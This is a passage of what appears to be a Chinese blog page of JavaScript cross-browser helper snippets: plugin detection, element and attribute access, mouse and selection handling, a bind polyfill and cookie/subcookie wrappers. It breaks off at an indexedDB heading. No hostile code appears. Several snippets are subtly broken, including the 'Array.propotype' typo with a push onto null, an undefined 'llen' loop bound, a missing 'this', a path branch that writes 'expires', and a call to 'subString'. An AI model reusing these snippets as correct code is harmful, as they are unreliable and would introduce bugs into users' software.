class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">* 检测插件方法一，IE下无效</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">name=name.toLowerCase();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;navigator.plugins.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(navigator.plugins[i].toLowerCase().indexOf(name)!=<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检测IE插件方法二 ,name是COM对象唯一标识符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasIEPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">new</span> ActiveXObject(name);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span>(ex)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">document</span>.all)&#123;<span class="comment">//IE5前</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">document</span>.all[id];</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"no way to retrieve element!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="检查对象的某个特性是否存在"><a href="#检查对象的某个特性是否存在" class="headerlink" title="检查对象的某个特性是否存在"></a>检查对象的某个特性是否存在</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isHostMethod</span>(<span class="params">object,property</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> t =<span class="keyword">typeof</span> object[property];</span><br><span class="line"><span class="keyword">return</span> t==<span class="string">"function"</span>||</span><br><span class="line">       (!!(t==<span class="string">"object"</span>)&amp;&amp;object[property])||</span><br><span class="line">       t==<span class="string">"unknown"</span>;<span class="comment">//不懂</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象转换成数组"><a href="#对象转换成数组" class="headerlink" title="对象转换成数组"></a>对象转换成数组</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convertToArray</span>(<span class="params">nodes</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> array=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">array=<span class="built_in">Array</span>.propotype.slice.call(nodes,<span class="number">0</span>);<span class="comment">//IE8前无效</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(ex)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,len=nodes.length;i&lt;len;i++)&#123;</span><br><span class="line">array.push(nodes[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="返回指定的属性"><a href="#返回指定的属性" class="headerlink" title="返回指定的属性"></a>返回指定的属性</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 返回指定的属性 IE ele.attribute[]</span></span><br><span class="line"><span class="comment"> * Element.getAttribute()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outputAttribute</span>(<span class="params">ele</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> pairs=<span class="keyword">new</span> <span class="built_in">Array</span>(),</span><br><span class="line">    attrname,attrvalue,u,len;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>,len=ele.attribute.length;i&lt;len;i++)&#123;</span><br><span class="line">attrname=ele.attributes[i].nodeName;</span><br><span class="line">attrvalue=ele.attributes[i].nodeValue;</span><br><span class="line"><span class="keyword">if</span>(ele.attributes[i].specified)&#123;<span class="comment">//IE</span></span><br><span class="line">pairs.push(attrname+<span class="string">'=\"'</span>+attrvalue+<span class="string">'\"'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ele是否存在指定属性"><a href="#ele是否存在指定属性" class="headerlink" title="ele是否存在指定属性"></a>ele是否存在指定属性</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * ele是否存在指定属性 attr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasattribute</span>(<span class="params">ele,attr</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(ele.hasAttribute)&#123;</span><br><span class="line"><span class="keyword">return</span> ele.hasAttribute(attr);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;<span class="comment">//IE</span></span><br><span class="line"><span class="keyword">return</span> ele.attributes[attr].specified;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ele是否符合选择器selector"><a href="#ele是否符合选择器selector" class="headerlink" title="ele是否符合选择器selector"></a>ele是否符合选择器selector</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ele是否符合选择器selector</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">matchesSelector</span>(<span class="params">ele,selector</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(ele.matchesSelector)&#123;</span><br><span class="line"><span class="keyword">return</span> ele.matchesSelector(selector);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ele.msmatchesSelector)&#123;</span><br><span class="line"><span class="keyword">return</span> ele.msmatchesSelector(selector);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ele.mozmatchesSelector)&#123;</span><br><span class="line"><span class="keyword">return</span> ele.mozmatchesSelector(selector);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ele.webkitmatchesSelector)&#123;</span><br><span class="line"><span class="keyword">return</span> ele.webkitmatchesSelector(selector);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"not support"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取内文本"><a href="#获取内文本" class="headerlink" title="获取内文本"></a>获取内文本</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//innerText/textContent</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getInnerText</span>(<span class="params">ele</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">typeof</span> ele.innerText==<span class="string">"string"</span>)?</span><br><span class="line">ele.innerText:ele.textContent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取鼠标事件的父元素"><a href="#获取鼠标事件的父元素" class="headerlink" title="获取鼠标事件的父元素"></a>获取鼠标事件的父元素</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelatedTarget</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(e.relatedTarget) <span class="keyword">return</span> e.relatedTarget;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(e.fromElement) <span class="keyword">return</span> e.fromElement;<span class="comment">//mouseover</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(e.toElement) <span class="keyword">return</span> e.toElement;<span class="comment">//mouseout</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="探测按的是鼠标的哪个键"><a href="#探测按的是鼠标的哪个键" class="headerlink" title="探测按的是鼠标的哪个键"></a>探测按的是鼠标的哪个键</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getButton</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">document</span>.implementation.hasFeature(<span class="string">"MouseEvents"</span>,<span class="string">"2.0"</span>))&#123;</span><br><span class="line">   <span class="keyword">return</span> e.button;</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">switch</span>(e.button)&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">   <span class="keyword">case</span> <span class="number">7</span>: <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">   <span class="keyword">case</span> <span class="number">6</span>:<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="鼠标滚动事件"><a href="#鼠标滚动事件" class="headerlink" title="鼠标滚动事件"></a>鼠标滚动事件</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//鼠标滚动，正数表示向上滚动</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getWheelDelta</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.wheelData)&#123;</span><br><span class="line">    <span class="keyword">return</span> (client.engine.opera&amp;&amp;client.engine.opera&lt;<span class="number">9.5</span>)?</span><br><span class="line">    -e.wheelData:e.wheelData;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> -e.detail*<span class="number">40</span>;<span class="comment">//firefox</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="提取选中的文本"><a href="#提取选中的文本" class="headerlink" title="提取选中的文本"></a>提取选中的文本</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSelectedText</span>(<span class="params">textbox</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> selectionStart==<span class="string">"number"</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> textbox.value.subString(textbox.selectionStart,textbox.selectionEnd);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">document</span>.selection)&#123;<span class="comment">//IE8之前没有selectionStart，selectionEnd属性</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">document</span>.selection.createRange().text;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="设置文本选中"><a href="#设置文本选中" class="headerlink" title="设置文本选中"></a>设置文本选中</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectText</span>(<span class="params">textbox,startIndex,stopIndex</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(textbox.setSelectionRange)&#123;</span><br><span class="line">textbox.setSelectionRange(startIndex,stopIndex);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(textbox.createTextRange)&#123;<span class="comment">//IE</span></span><br><span class="line"><span class="keyword">var</span> range=textbox.createTextRange();</span><br><span class="line">range.collapse(<span class="literal">true</span>);</span><br><span class="line">range.moveStart(<span class="string">"character"</span>,<span class="number">0</span>);</span><br><span class="line">range.moveEnd(<span class="string">"character"</span>,stopIndex-startIndex);</span><br><span class="line">range.select();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bind方法对老版本的浏览器不起作用"><a href="#bind方法对老版本的浏览器不起作用" class="headerlink" title="bind方法对老版本的浏览器不起作用"></a>bind方法对老版本的浏览器不起作用</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="built_in">Function</span>.prototype.bind || <span class="function"><span class="keyword">function</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context, <span class="built_in">arguments</span>);</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="包装cookie"><a href="#包装cookie" class="headerlink" title="包装cookie"></a>包装cookie</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//cookie</span></span><br><span class="line"><span class="keyword">var</span> cookieUtil=&#123;</span><br><span class="line"><span class="comment">// 创建cookie</span></span><br><span class="line">setcookie:<span class="function"><span class="keyword">function</span> (<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cookieText = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(value);</span><br><span class="line">    <span class="keyword">if</span> (expires <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</span><br><span class="line">        cookieText += <span class="string">'; expires='</span> + expires.toGMTString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path) &#123;</span><br><span class="line">        cookieText += <span class="string">'; path='</span> + path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (domain) &#123;</span><br><span class="line">        cookieText += <span class="string">'; domain='</span> + domain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">        cookieText += <span class="string">'; secure'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = cookieText;</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">// 获取cookie</span></span><br><span class="line">    getcookie:<span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cookieName = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">var</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</span><br><span class="line">    <span class="keyword">var</span> cookieValue = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</span><br><span class="line">        <span class="keyword">if</span> (cookieEnd == <span class="number">-1</span>) &#123;</span><br><span class="line">            cookieEnd = <span class="built_in">document</span>.cookie.length;</span><br><span class="line">        &#125;</span><br><span class="line">        cookieValue = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cookieValue;</span><br><span class="line">&#125;,</span><br><span class="line">   <span class="comment">// 删除cookie</span></span><br><span class="line">    unsetcookie:<span class="function"><span class="keyword">function</span> (<span class="params">name,path,domain,secure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setcookie(name,<span class="string">""</span>,<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>),path,domain,secure);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="包装子cookie"><a href="#包装子cookie" class="headerlink" title="包装子cookie"></a>包装子cookie</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子cookie</span></span><br><span class="line"><span class="keyword">var</span> subcookieUtil=&#123;</span><br><span class="line">get:<span class="function"><span class="keyword">function</span>(<span class="params">name,subname</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> subcookie=getAll(name);</span><br><span class="line"><span class="keyword">if</span>(subcookie)&#123;</span><br><span class="line"><span class="keyword">return</span> subcookie[subname];</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">getAll:<span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> cookieName = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>;</span><br><span class="line">        <span class="keyword">var</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</span><br><span class="line">        <span class="keyword">var</span> cookieValue = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> subcookie,result=&#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> len,i,parts;</span><br><span class="line">        <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</span><br><span class="line">            <span class="keyword">if</span> (cookieEnd == <span class="number">-1</span>) &#123;</span><br><span class="line">            cookieEnd = <span class="built_in">document</span>.cookie.length;</span><br><span class="line">           &#125;</span><br><span class="line">        cookieValue = <span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd);</span><br><span class="line">        <span class="keyword">if</span>(cookieValue.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        subcookie=cookieValue.split(<span class="string">'&amp;'</span>);</span><br><span class="line">        len=subcookie.length;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;llen;i++)&#123;</span><br><span class="line">        parts=subcookie[i].split(<span class="string">'='</span>);</span><br><span class="line">        result[parts[<span class="number">0</span>]]=parts[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">set:<span class="function"><span class="keyword">function</span> (<span class="params">name, subname,value, expires, path, domain, secure</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> subcookies=<span class="keyword">this</span>.getAll(name)||&#123;&#125;;</span><br><span class="line">subcookies[subname]=value;</span><br><span class="line"><span class="keyword">this</span>.setAll(name,subcookies,expires,path,domain,secure);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">setAll:<span class="function"><span class="keyword">function</span>(<span class="params">name,subcookies,expires,path,domain,secure</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> cookieText = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>;</span><br><span class="line">        <span class="keyword">var</span> subcookiesParts=<span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">var</span> subname;</span><br><span class="line">        <span class="keyword">for</span>(subname <span class="keyword">in</span> subcookies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(subname.length&gt;<span class="number">0</span>&amp;&amp;subcookies.hasOwnProperty(subname))&#123;</span><br><span class="line">        subcookiesParts.push(<span class="built_in">encodeURIComponent</span>(subname)+<span class="string">'='</span>+<span class="built_in">encodeURIComponent</span>(subcookies[subname]));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(subcookiesParts.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        cookieText+=subcookiesParts.join(<span class="string">'&amp;'</span>);</span><br><span class="line">        <span class="keyword">if</span> (expires <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</span><br><span class="line">                cookieText += <span class="string">'; expires='</span> + expires.toGMTString();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (path) &#123;</span><br><span class="line">                cookieText += <span class="string">'; expires='</span> + expires;</span><br><span class="line">             &#125;</span><br><span class="line">            <span class="keyword">if</span> (domain) &#123;</span><br><span class="line">                cookieText += <span class="string">'; domain='</span> + domain;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">                cookieText += <span class="string">'; secure'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">document</span>.cookie = cookieText;</span><br><span class="line">    &#125;,</span><br><span class="line">    unset:<span class="function"><span class="keyword">function</span>(<span class="params">name,subname,path,domain,secure</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> subcookies=<span class="keyword">this</span>.getAll(name);</span><br><span class="line">    <span class="keyword">if</span>(subcookies)&#123;</span><br><span class="line">      <span class="keyword">delete</span> subcookies[subname];</span><br><span class="line">      <span class="keyword">this</span>.setAll(name,subcookies,<span class="literal">null</span>,path,domain,secure);</span><br><span class="line">      &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    unsetAll:<span class="function"><span class="keyword">function</span>(<span class="params">name,path,domain,secure</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.setAll(name,<span class="literal">null</span>,<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>),path,domain,secure);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="indexedDB"><a href="#indexedDB" class="headerlink" title="indexedDB"></a>indexedDB</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 